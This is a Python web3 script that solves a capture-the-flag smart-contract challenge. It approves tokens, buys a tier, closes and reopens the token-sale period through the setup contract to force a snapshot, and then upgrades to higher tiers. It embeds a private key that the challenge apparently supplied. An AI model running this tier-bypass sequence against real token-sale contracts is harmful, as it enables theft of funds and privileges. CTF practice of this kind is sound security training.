from web3 import Web3
from eth_account import Account
import time
# Your credentials from the challenge - UPDATED!
RPC_URL = "http://challenges.1pc.tf:43086/0adb613a-d643-432a-8aa6-fd5c04c185c9"
PRIVATE_KEY = "f57f5cf194f191909a0780f11f53f18ede76998f7f8360dcacef677951626321"
SETUP_ADDRESS = "0x389b9061DEdcF3B1c127BDcC758A30dFC5cE0A56"
WALLET_ADDR = "0x8feD999C6BE3830d0Eef2cCB8CBc57E35D1d28eA"
# Connect to blockchain
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = Account.from_key(PRIVATE_KEY)
print(f"🔗 Connected to: {RPC_URL}")
print(f"👛 Your address: {account.address}")
print(f"💰 Balance: {w3.eth.get_balance(account.address)} wei\n")
# Setup contract ABI (minimal)
SETUP_ABI = [
    {"inputs": [], "name": "tge", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "token", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [{"name": "_tge", "type": "bool"}], "name": "enableTge", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "isSolved", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"}
]
# Token contract ABI (ERC20)
TOKEN_ABI = [
    {"inputs": [{"name": "spender", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "approve", "outputs": [{"type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"}
]
# TGE contract ABI
TGE_ABI = [
    {"inputs": [], "name": "buy", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "tier", "type": "uint256"}], "name": "upgrade", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "", "type": "address"}], "name": "userTiers", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "isTgePeriod", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "tgeActivated", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"}
]
# Load contracts
setup = w3.eth.contract(address=Web3.to_checksum_address(SETUP_ADDRESS), abi=SETUP_ABI)
token_address = setup.functions.token().call()
tge_address = setup.functions.tge().call()
token = w3.eth.contract(address=token_address, abi=TOKEN_ABI)
tge = w3.eth.contract(address=tge_address, abi=TGE_ABI)
print(f"📄 Token contract: {token_address}")
print(f"📄 TGE contract: {tge_address}\n")
def send_tx(func):
    """Helper function to send transactions"""
    tx = func.build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 2000000,
        'gasPrice': w3.eth.gas_price
    })
    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return receipt
# Check initial state
print("🔍 Initial state:")
print(f" Token balance: {token.functions.balanceOf(account.address).call()}")
print(f" Current tier: {tge.functions.userTiers(account.address).call()}")
print(f" TGE period active: {tge.functions.isTgePeriod().call()}")
print(f" TGE activated: {tge.functions.tgeActivated().call()}\n")
# Step 1: Approve TGE contract to spend tokens
print("📝 Step 1: Approving TGE contract to spend 15 tokens...")
receipt = send_tx(token.functions.approve(tge_address, 15))
print(f" ✅ Transaction successful: {receipt['transactionHash'].hex()}\n")
# Step 2: Buy TIER_1
print("🛒 Step 2: Buying TIER_1...")
receipt = send_tx(tge.functions.buy())
print(f" ✅ Transaction successful: {receipt['transactionHash'].hex()}")
print(f" Current tier: {tge.functions.userTiers(account.address).call()}\n")
# Step 3: Trigger snapshot by closing and reopening TGE
print("📸 Step 3: Triggering snapshot (close TGE)...")
receipt = send_tx(setup.functions.enableTge(False))
print(f" ✅ TGE closed: {receipt['transactionHash'].hex()}")
print(f" TGE activated: {tge.functions.tgeActivated().call()}\n")
print("🔓 Step 4: Reopening TGE period...")
receipt = send_tx(setup.functions.enableTge(True))
print(f" ✅ TGE reopened: {receipt['transactionHash'].hex()}")
print(f" TGE period active: {tge.functions.isTgePeriod().call()}\n")
# Step 5: Upgrade to TIER_2
print("⬆️ Step 5: Upgrading to TIER_2...")
receipt = send_tx(tge.functions.upgrade(2))
print(f" ✅ Transaction successful: {receipt['transactionHash'].hex()}")
print(f" Current tier: {tge.functions.userTiers(account.address).call()}\n")
# Step 6: Upgrade to TIER_3
print("⬆️ Step 6: Upgrading to TIER_3...")
receipt = send_tx(tge.functions.upgrade(3))
print(f" ✅ Transaction successful: {receipt['transactionHash'].hex()}")
print(f" Current tier: {tge.functions.userTiers(account.address).call()}\n")
# Check if solved
print("🎉 Checking if challenge is solved...")
is_solved = setup.functions.isSolved().call()
print(f" Challenge solved: {is_solved}\n")
if is_solved:
    print("✨ SUCCESS! Now go get your flag!")
    print(" Option 1: Click 'Flag' button on the web interface")
    print(" Option 2: nc challenges.1pc.tf 47600 -> type 3")
else:
    print("❌ Something went wrong. Check the logs above.")
